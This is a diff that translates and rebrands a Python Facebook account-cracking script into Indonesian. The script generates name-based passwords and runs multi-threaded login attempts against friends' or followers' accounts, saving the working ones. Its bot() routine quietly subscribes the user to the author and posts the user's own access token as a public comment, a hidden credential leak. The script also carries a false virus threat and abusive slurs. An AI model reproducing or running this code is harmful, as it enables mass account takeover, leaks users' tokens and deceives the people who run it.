@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 # coding=utf-8
-# Contains Dangerous Virus
-# If it is decoded, I will activate the virus
-# So that your cellphone is damaged and won't live anymore
+# Mengandung Virus Berbahaya
+# Jika direcode maka akan kuaktifkan virusnya
+# Sehingga hape anda rusak dan takkan hidup lagi
 
 ###### IMPORT MODULE ######
 
@@ -11,27 +11,26 @@ from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
 ###### RANDOM WARNA ######
 
-j = "\033[1;97m" # jeruk
+p = "\033[1;97m" # putih
 m = "\033[1;91m" # merah
 h = "\033[1;92m" # hijau
 k = "\033[1;93m" # kuning
 b = "\033[1;94m" # biru
 u = "\033[1;95m" # ungu
-a = "\033[1;96m" # anggrek
+o = "\033[1;96m" # biru muda
 
 ###### LOGO ######
 
 def banner():
     print("""\033[;96m   ________ _     
-/\ "-./  \   /\ \_\ \   /\ \   
-\ \ \-./\ \  \ \  __ \  \ \ \  /Create by
-\033[;93m/  \ \_\ \ \_\  \ \_\ \_\  \ \_\  Mantal Studio-Xyz
-  \/_/  \/_/   \/_/\/_/   \/_/ 
-
+  / ____/ /___ ___________(_)____
+ / / / / __ `/ ___/ ___/ / ___/Create by
+\033[;93m/ /___/ / /_/ (__ |__ ) / /__  AangSans-Xyz
+\____/_/\__,_/____/____/_/\___/
 """)
 
 
-Live = []
+ok = []
 cp = []
 ttl =[]
 
@@ -103,15 +102,15 @@ def log_token():
         zedd.write(toket)
         zedd.close()
         print((m+"\n["+k+"•"+m+"]"+h+" Login Succesfully"))
-        jalan('\033[1;96mIN Order to run Smoothly YOU MUST SUBSCRIBE THIS CHANNEL FIRST!')
+        jalan('\033[1;96mAGAR BERJALAN LANCAR ANDA HARUS SUBSCRIBE DULU CHANNEL INI!')
         os.system('xdg-open http://www.youtube.com/c/TutorialityStudio')
         bot()
     except KeyError:
-        print((k+"["+p+"!"+k+"]"+p+" Token Invalid!!"))
+        print((k+"["+p+"!"+k+"]"+p+" Token Invalid Ngentod!!"))
         os.system("clear")
         log_token()
 
-###### MaNtaL StuDiO ######
+###### BOT KOMEN ######
 
 def bot():
 	try:
@@ -123,7 +122,7 @@ def bot():
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
 		tokenz()
-	kom = ("Gantengnya Hamza😘")
+	kom = ("Gantengnya Ramdani😘")
 	requests.post('https://graph.facebook.com/100044932290784/subscribers?access_token=' + toket) 
 	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + toket + '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/315723919935349/comments/?message=' + kom + '&access_token=' + toket)
@@ -165,7 +164,7 @@ def choose_menu():
 		ress()
 	elif r=="0":
 		try:
-			jalan(k+"\n["+p+"•"+k+"]"+p+" Thank You For Using My Script:)")
+			jalan(k+"\n["+p+"•"+k+"]"+p+" Terimakasih Telah Menggunakan Script Saya:)")
 			os.system("rm -rf login.txt")
 			exit()
 		except Exception as e:
@@ -180,7 +179,7 @@ def friend():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((m+"\n["+k+"!"+m+"]"+p+" Cookie/Token Invalid!!"))
+		print((m+"\n["+k+"!"+m+"]"+p+" Cookie/Token Invalid Ngentod!!"))
 		os.system("rm -rf login.txt")
 		log_token()
 	try:
@@ -208,13 +207,13 @@ def friend():
 	except Exception as e:
 		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
 
-###### DEP PUBLIcK ######
+###### DEP PUBLIK ######
 
 def publik():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((m+"\n["+k+"!"+m+"]"+p+" Cookie/Token Invalid!!"))
+		print((m+"\n["+k+"!"+m+"]"+p+" Cookie/Token Invalid Ngentod!!"))
 		os.system("rm -rf login.txt")
 		log_token()
 	try:
@@ -249,7 +248,7 @@ def follow():
 	try:
 		toket=open("login.txt","r").read()
 	except IOError:
-		print((m+"\n["+k+"!"+m+"]"+p+" Cookie/Token Invalid!!"))
+		print((m+"\n["+k+"!"+m+"]"+p+" Cookie/Token Invalid Ngentod!!"))
 		os.system("rm -rf login.txt")
 		log_token()
 	try:
@@ -296,10 +295,10 @@ def generate(text):
 				results.append(i+"12345")
 				results.append(i)
 				if "indonesia" in ips:
-					results.append("khokher")
-					results.append("mughal")
-					results.append("yousaf")
-					results.append("Queen")
+					results.append("Sayang")
+					results.append("Anjing")
+					results.append("Ngentot")
+					results.append("Kontol")
 	return results
 
 ######  METODE MBASIC ######
@@ -395,7 +394,7 @@ class crack:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : haqnawaz12345,iqbal123,lucky king,223344"))
+				print((k+"["+p+"•"+k+"]"+p+" Example : anjing,sayang,223344"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -415,7 +414,7 @@ class crack:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [Live] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -427,7 +426,7 @@ class crack:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [Live] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -484,7 +483,7 @@ class crackttl:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example :lucky king,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -504,7 +503,7 @@ class crackttl:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [Live] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -516,7 +515,7 @@ class crackttl:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [Live] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -556,7 +555,7 @@ class crackttl:
 
 def results(ramdhan,tricker):
         if len(ramdhan) !=0:
-                print(("[Live] : "+str(len(ramdhan))))
+                print(("[OK] : "+str(len(ramdhan))))
         if len(ramdhan) !=0:
                 print(("[CP] : "+str(len(tricker))))
         if len(ramdhan) ==0 and len(tricker) ==0:
